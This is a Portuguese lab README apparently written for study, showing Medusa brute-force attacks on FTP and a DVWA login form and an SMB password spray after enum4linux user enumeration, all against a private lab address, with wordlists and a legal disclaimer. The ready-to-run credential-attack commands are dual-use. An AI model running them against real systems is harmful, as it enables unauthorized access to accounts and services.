# 💀 Ataques de Força Bruta com Medusa e Enumeração de Usuários

Este repositório demonstra exemplos práticos de **ataques de força bruta e password spray** utilizando a ferramenta **Medusa**, aplicados em protocolos **FTP**, **HTTP (DVWA)** e **SMB**.  
O conteúdo é destinado a fins **educacionais e de laboratório**, visando compreender métodos de ataque e defesa no contexto de segurança ofensiva.

> ⚠️ **Aviso Legal:**  
> Este material é destinado **exclusivamente para fins de estudo em ambientes controlados** (como laboratórios virtuais).  
> Nunca execute estes comandos em sistemas sem autorização expressa. O uso indevido pode violar leis de segurança digital.

---

## 🧩 Pré-requisitos

- Sistema Linux (recomendado: Kali Linux)
- Ferramentas necessárias:
  - `medusa`
  - `enum4linux`
  - `smbclient`

---

## 📁 Estrutura de Arquivos

| Arquivo | Descrição |
|----------|------------|
| `users.txt` | Lista de possíveis usuários para ataque de força bruta |
| `pass.txt` | Lista de senhas comuns para teste |
| `smb_users.txt` | Lista de usuários SMB gerada para password spray |
| `senhas_spray.txt` | Lista de senhas reduzida para password spray |
| `enum4_output.txt` | Resultado da enumeração de usuários SMB |

---

## 🚀 Ataque de Força Bruta (FTP)

Criação das wordlists iniciais:

```bash
echo -e "user
msfadmin
admin
root" > users.txt
echo -e "123456
password
qwerty
msfadmin" > pass.txt
```

Execução do ataque:

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
```

---

## 🌐 Ataque de Força Bruta em Formulário Web (DVWA)

### 1️⃣ Configuração da URL de Login

- URL de destino:  
  `http://192.168.56.102/dvwa/login.php`

### 2️⃣ Execução do ataque com Medusa

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&login=Login' \
-m 'FAIL=Login failed' -t 6
```

---

## 🔁 Password Spray (SMB)

### 1️⃣ Enumeração de Usuários

```bash
enum4linux -a 192.168.56.102 | tee enum4_output.txt
less enum4_output.txt
```

### 2️⃣ Criação das Wordlists

```bash
echo -e "user
msfadmin
service
suslog
www-data
root
news
postgres
mail
mysql
backup" > smb_users.txt
echo -e "123456
password
welcome123
msfadmin" > senhas_spray.txt
```

### 3️⃣ Execução do Ataque

```bash
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

### 4️⃣ Teste de Acesso com Credenciais Encontradas

```bash
smbclient -L //192.168.56.102 -U msfadmin
```

---

## 🧠 Conceitos Envolvidos

| Termo | Descrição |
|--------|------------|
| **Força Bruta** | Técnica que testa todas as combinações possíveis de usuário/senha. |
| **Password Spray** | Ataque que testa poucas senhas comuns em muitos usuários para evitar bloqueios. |
| **Enumeração (enum4linux)** | Processo de listar usuários e compartilhamentos SMB antes do ataque. |
| **DVWA (Damn Vulnerable Web App)** | Aplicação vulnerável usada para práticas seguras de pentest. |

---

## 🧰 Referências

- Medusa Project - SourceForge
- Enum4linux GitHub
- DVWA Official Page

---

## 📜 Licença

Distribuído sob a licença **MIT**. Consulte o arquivo `LICENSE` para mais detalhes.

---

## ✍️ Autor

**Everton Alves**

